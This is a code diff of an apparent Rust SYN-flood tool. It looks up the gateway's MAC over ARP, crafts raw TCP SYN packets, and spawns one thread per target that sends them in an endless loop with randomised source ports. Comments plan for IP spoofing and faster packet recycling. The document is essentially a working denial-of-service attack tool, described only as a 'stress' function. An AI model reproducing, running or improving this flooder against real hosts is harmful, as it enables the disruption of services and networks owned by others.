@@ -5,13 +5,9 @@ use clap::Parser;
 
 use default_net::gateway::Gateway;
 use default_net::interface::{get_default_interface, get_interfaces};
-use default_net::ip::Ipv4Net;
-
-use pnet::ipnetwork::IpNetwork;
 
 use pnet::datalink::Channel::Ethernet;
-use pnet::datalink::{self, DataLinkReceiver, DataLinkSender};
-use pnet::datalink::{MacAddr, NetworkInterface};
+use pnet::datalink::{self, DataLinkReceiver, DataLinkSender, MacAddr, NetworkInterface};
 use pnet::packet::arp::{ArpHardwareTypes, ArpOperations, ArpPacket, MutableArpPacket};
 use pnet::packet::ethernet::{EtherTypes, MutableEthernetPacket};
 use pnet::packet::ip::IpNextHeaderProtocols;
@@ -22,18 +18,20 @@ use pnet::packet::MutablePacket;
 use std::error::Error;
 use std::net::{IpAddr, Ipv4Addr};
 use std::str::FromStr;
+use std::sync::Arc;
 use std::thread;
 
 const ETHERNET_HEADER_LEN: usize = 14;
+const ETHERNET_ARP_PACKET_LEN: usize = 42;
 const IPV4_HEADER_LEN: usize = 20;
+const ARP_PACKET_LEN: usize = 28;
+const TCP_SYN_PACKET_LEN: usize = 66;
 
-pub struct Config<'a> {
-    pub destination: &'a Target,
-    pub destination_mac: &'a MacAddr,
-    pub ipv4: &'a Vec<Ipv4Net>,
+#[derive(Debug, Copy, Clone)]
+pub struct Config {
     pub iface_ip: Ipv4Addr,
-    pub iface_name: &'a String,
-    pub iface_src_mac: &'a MacAddr,
+    pub src_mac: MacAddr,
+    pub dest_mac: MacAddr,
 }
 
 #[derive(Debug, PartialEq)]
@@ -43,21 +41,21 @@ pub struct Target {
 }
 
 // XXX: it's actually MacAddr or error (i assume, should be just a Result)
-fn arp_get_mac(
+fn find_mac(
     sender: &mut Box<dyn DataLinkSender>,
     receiver: &mut Box<dyn DataLinkReceiver>,
-    interface: &NetworkInterface,
+    source_mac: MacAddr,
     source_ip: Ipv4Addr,
     target_ip: Ipv4Addr,
 ) -> MacAddr {
-    let mut ethernet_buffer = [0u8; 42];
+    let mut ethernet_buffer = [0u8; ETHERNET_ARP_PACKET_LEN];
     let mut ethernet_packet = MutableEthernetPacket::new(&mut ethernet_buffer).unwrap();
 
+    ethernet_packet.set_source(source_mac);
     ethernet_packet.set_destination(MacAddr::broadcast());
-    ethernet_packet.set_source(interface.mac.unwrap());
     ethernet_packet.set_ethertype(EtherTypes::Arp);
 
-    let mut arp_buffer = [0u8; 28];
+    let mut arp_buffer = [0u8; ARP_PACKET_LEN];
     let mut arp_packet = MutableArpPacket::new(&mut arp_buffer).unwrap();
 
     arp_packet.set_hardware_type(ArpHardwareTypes::Ethernet);
@@ -65,7 +63,7 @@ fn arp_get_mac(
     arp_packet.set_hw_addr_len(6);
     arp_packet.set_proto_addr_len(4);
     arp_packet.set_operation(ArpOperations::Request);
-    arp_packet.set_sender_hw_addr(interface.mac.unwrap());
+    arp_packet.set_sender_hw_addr(source_mac);
     arp_packet.set_sender_proto_addr(source_ip);
     arp_packet.set_target_hw_addr(MacAddr::zero());
     arp_packet.set_target_proto_addr(target_ip);
@@ -79,6 +77,8 @@ fn arp_get_mac(
         .unwrap();
 
     // XXX: loop thourgh packets with timeout
+    // XXX: there's a race condition here :(
+    //      we have to run reader first
     loop {
         match receiver.next() {
             Ok(buf) => {
@@ -97,31 +97,30 @@ fn arp_get_mac(
     }
 }
 
-pub fn build_packet(config: &Config, tmp_packet: &mut [u8]) {
-    // XXX: keep configuration for IP spoofing
+// XXX: keep configuration for IP spoofing
+fn build_syn_packet(config: &Config, destination: &Target, buf: &mut [u8]) {
     let iface_ip = config.iface_ip;
 
     // setup Ethernet header
     {
-        let mut eth_header =
-            MutableEthernetPacket::new(&mut tmp_packet[..ETHERNET_HEADER_LEN]).unwrap();
+        let mut eth_header = MutableEthernetPacket::new(&mut buf[..ETHERNET_HEADER_LEN]).unwrap();
 
-        eth_header.set_destination(*config.destination_mac);
-        eth_header.set_source(*config.iface_src_mac);
+        eth_header.set_destination(config.dest_mac);
+        eth_header.set_source(config.src_mac);
         eth_header.set_ethertype(EtherTypes::Ipv4);
     }
 
     // setup IP header
     {
         let mut ip_header = MutableIpv4Packet::new(
-            &mut tmp_packet[ETHERNET_HEADER_LEN..(ETHERNET_HEADER_LEN + IPV4_HEADER_LEN)],
+            &mut buf[ETHERNET_HEADER_LEN..(ETHERNET_HEADER_LEN + IPV4_HEADER_LEN)],
         )
         .unwrap();
         ip_header.set_header_length(69);
         ip_header.set_total_length(52);
         ip_header.set_next_level_protocol(IpNextHeaderProtocols::Tcp);
         ip_header.set_source(iface_ip);
-        ip_header.set_destination(config.destination.addr);
+        ip_header.set_destination(destination.addr);
         ip_header.set_identification(rand::random::<u16>());
         ip_header.set_ttl(64);
         ip_header.set_version(4);
@@ -134,13 +133,10 @@ pub fn build_packet(config: &Config, tmp_packet: &mut [u8]) {
     // setup TCP header
     {
         let mut tcp_header =
-            MutableTcpPacket::new(&mut tmp_packet[(ETHERNET_HEADER_LEN + IPV4_HEADER_LEN)..])
-                .unwrap();
+            MutableTcpPacket::new(&mut buf[(ETHERNET_HEADER_LEN + IPV4_HEADER_LEN)..]).unwrap();
 
-        // XXX: this should be in the range 32000-61000, or read sysctl settings
-        //      to be even more precise than this
         tcp_header.set_source(rand::random::<u16>());
-        tcp_header.set_destination(config.destination.port);
+        tcp_header.set_destination(destination.port);
         tcp_header.set_flags(TcpFlags::SYN);
         tcp_header.set_window(65535);
         tcp_header.set_data_offset(8);
@@ -154,119 +150,44 @@ pub fn build_packet(config: &Config, tmp_packet: &mut [u8]) {
             TcpOption::wscale(6),
         ]);
 
-        let checksum = tcp::ipv4_checksum(
-            &tcp_header.to_immutable(),
-            &iface_ip,
-            &config.destination.addr,
-        );
+        let checksum = tcp::ipv4_checksum(&tcp_header.to_immutable(), &iface_ip, &destination.addr);
         tcp_header.set_checksum(checksum);
     }
 }
 
-pub fn repurpose_packet(config: &Config, tmp_packet: &mut [u8]) {
-    // XXX: i'm not sure if need to update identification bit from IP header
-
+// XXX: i'm not sure if need to update identification bit from IP header
+fn recycle_syn_packet(config: &Config, destination: &Target, buf: &mut [u8]) {
     // update TCP header
     {
         let mut tcp_header =
-            MutableTcpPacket::new(&mut tmp_packet[(ETHERNET_HEADER_LEN + IPV4_HEADER_LEN)..])
-                .unwrap();
+            MutableTcpPacket::new(&mut buf[(ETHERNET_HEADER_LEN + IPV4_HEADER_LEN)..]).unwrap();
 
+        // XXX: it's likely to be much faster to cycle over shuffle vector
         tcp_header.set_source(rand::random::<u16>());
         let checksum = tcp::ipv4_checksum(
             &tcp_header.to_immutable(),
             &config.iface_ip,
-            &config.destination.addr,
+            &destination.addr,
         );
         tcp_header.set_checksum(checksum);
     }
 }
 
-fn sender(iface_name: String, destination: &Target) {
-    let dinterfaces = get_interfaces();
-    let dinterface = dinterfaces
-        .iter()
-        .find(|iface| iface.name == iface_name)
-        .unwrap();
-
-    // found iface to work with
-    print!("Interface: {:?}\n", dinterface);
-
-    // XXX: no need to search the same thing twice
-    let interfaces = datalink::interfaces();
-    let interface = interfaces
-        .iter()
-        .find(|iface| iface.name == iface_name)
-        .unwrap();
-
-    // XXX: take this from dinterface instead
-    // take IPv4 addr
-    let iface_ip = interface
-        .ips
-        .iter()
-        .filter_map(|network| match network.ip() {
-            IpAddr::V4(ipv4) => Some(ipv4),
-            _ => None,
-        })
-        .next()
-        .expect(&format!(
-            "the interface {} does not have any IP addresses",
-            interface
-        ));
-
-    let inet = interface
-        .ips
-        .iter()
-        .filter_map(|network| match network {
-            IpNetwork::V4(inet) => Some(inet),
-            _ => None,
-        })
-        .next()
-        .unwrap();
-
-    println!("All IPs: {:?}", inet.size());
-    println!("Source IP: {}", iface_ip);
-
-    let (mut tx, mut rx) = match datalink::channel(&interface, Default::default()) {
+fn stress(iface: &NetworkInterface, config: Config, destination: &Target) {
+    let (mut tx, _) = match datalink::channel(iface, Default::default()) {
         Ok(Ethernet(tx, rx)) => (tx, rx),
         Ok(_) => panic!("Unknown channel type"),
         Err(e) => panic!("Error happened {}", e),
     };
 
-    // XXX: only replace target IP with gateway if it's not broadcast
-    let gateway_ip = match dinterface.gateway {
-        Some(Gateway { ip_addr, .. }) => {
-            if let IpAddr::V4(ip_addr) = ip_addr {
-                ip_addr
-            } else {
-                todo!()
-            }
-        }
-        _ => destination.addr,
-    };
+    let mut buffer = [0u8; TCP_SYN_PACKET_LEN];
 
-    println!("Gateway IP: {}", gateway_ip);
-
-    let destination_mac = arp_get_mac(&mut tx, &mut rx, interface, iface_ip, gateway_ip);
-
-    print!("Remote addr MAC: {:?}\n", destination_mac);
-
-    let config = Config {
-        destination,
-        destination_mac: &destination_mac,
-        ipv4: &dinterface.ipv4,
-        iface_ip,
-        iface_name: &interface.name,
-        iface_src_mac: &interface.mac.unwrap(),
-    };
-
-    let mut buffer = [0u8; 66];
     // building initial packet
-    build_packet(&config, &mut buffer);
-    // XXX: do everything before this line in main thread (including ARP resolve)
+    build_syn_packet(&config, destination, &mut buffer);
+
     loop {
-        // replace port field in the packet
-        repurpose_packet(&config, &mut buffer);
+        // replace port field in the packet, recompute checksum
+        recycle_syn_packet(&config, destination, &mut buffer);
         tx.send_to(&buffer, None);
     }
 }
@@ -321,11 +242,85 @@ fn main() {
     "
     );
 
+    print!("Preparing config...");
+
     let iface = get_default_interface().unwrap();
+    let iface_name = iface.name;
+
+    let dinterface = get_interfaces()
+        .into_iter()
+        .find(|iface| iface.name == iface_name)
+        .unwrap();
+
+    // XXX: no need to search the same thing twice
+    let interfaces = datalink::interfaces();
+    let interface = interfaces
+        .into_iter()
+        .find(|iface| iface.name == iface_name)
+        .unwrap();
+
+    // XXX: take this from dinterface instead
+    let iface_ip = interface
+        .ips
+        .iter()
+        .filter_map(|network| match network.ip() {
+            IpAddr::V4(ipv4) => Some(ipv4),
+            _ => None,
+        })
+        .next()
+        .expect(&format!(
+            "the interface {} does not have any IP addresses",
+            interface
+        ));
+
+    // XXX: only replace target IP with gateway if it's not broadcast
+    let gateway_ip = match dinterface.gateway {
+        Some(Gateway { ip_addr, .. }) => {
+            if let IpAddr::V4(ip_addr) = ip_addr {
+                ip_addr
+            } else {
+                panic!("Default gateway cannot be detected")
+            }
+        }
+        _ => panic!("Default gateway cannot be detected"),
+    };
+
+    let (mut tx, mut rx) = match datalink::channel(&interface, Default::default()) {
+        Ok(Ethernet(tx, rx)) => (tx, rx),
+        Ok(_) => panic!("Unknown channel type"),
+        Err(e) => panic!("Error happened {}", e),
+    };
+
+    let destination_mac = find_mac(
+        &mut tx,
+        &mut rx,
+        interface.mac.unwrap(),
+        iface_ip,
+        gateway_ip,
+    );
+
+    println!(" DONE");
+    println!(
+        "Source:\n  iface {}\n  inet {}\n  gw {}\n  ether {}\n  dest {}\n",
+        iface_name,
+        iface_ip,
+        gateway_ip,
+        interface.mac.unwrap(),
+        destination_mac
+    );
+
+    let config = Config {
+        iface_ip,
+        src_mac: interface.mac.unwrap(),
+        dest_mac: destination_mac,
+    };
+
     let mut handles = Vec::new();
+    let interface = Arc::new(interface);
+    // XXX: much better option would be to keep number of workers as a parameter
     for target in args.target.into_iter() {
-        let iface_name = iface.name.clone();
-        handles.push(thread::spawn(move || sender(iface_name, &target)));
+        let interface = Arc::clone(&interface);
+        handles.push(thread::spawn(move || stress(&interface, config, &target)));
     }
     for handle in handles.into_iter() {
         handle.join().unwrap();
